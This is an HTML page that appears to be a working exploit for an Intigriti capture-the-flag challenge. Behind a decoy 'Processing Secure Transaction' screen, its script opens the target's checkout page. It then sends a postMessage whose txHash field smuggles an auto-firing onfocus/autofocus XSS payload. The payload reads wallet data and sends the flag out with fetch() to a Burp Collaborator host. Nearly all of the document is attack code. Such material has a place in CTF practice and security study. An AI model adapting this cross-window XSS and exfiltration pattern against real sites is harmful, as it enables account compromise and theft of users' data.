<!DOCTYPE html>
<html>
<head>
    <title>Transaction Processing</title>
    <style>
        body { background: #050A0E; color: #00FF88; font-family: monospace; text-align: center; padding-top: 20%; }
    </style>
</head>
<body>
    <h1>Processing Secure Transaction...</h1>
    <p>Verifying blockchain confirmation...</p>

    <script>
        const TARGET = 'https://challenge-0126.intigriti.io';
        const COLLAB = 'https://YOUR-COLLABORATOR.oastify.com';
        
        // Payload: Uses onfocus + autofocus for auto-execution
        // Checks for 1337COIN wallet and exfiltrates flag
        const payload = `" onfocus="fetch('/api/wallets').then(r=>r.json()).then(wallets=>{
            const flagWallet = wallets.find(w=>w.currency==='1337COIN');
            if(flagWallet && flagWallet.balance > 0){
                document.getElementById('flagBanner').classList.remove('hidden');
                fetch('${COLLAB}?flag='+encodeURIComponent(document.getElementById('flagText').innerText));
            }
        })" autofocus="`;
        
        // Step 1: Open checkout with BTC (guaranteed to have wallet)
        const win = window.open(`${TARGET}/checkout.html?currency=1337COIN&price=1`);
        
        // Step 2: Send malicious transaction
        setTimeout(() => {
            win.postMessage({
                type: 'submitTransaction',
                transaction: {
                    currency: '1337COIN', // Use BTC to avoid alert blocking
                    amount: 0.0001,
                    toAddress: 'hacker-address',
                    txHash: payload // XSS injection here
                }
            }, '*');
        }, 2000);
        
        // Step 3: Redirect to MarketWatch after transaction
        setTimeout(() => {
            win.location.href = `${TARGET}/marketwatch.html`;
        }, 4000);
    </script>
</body>
</html>
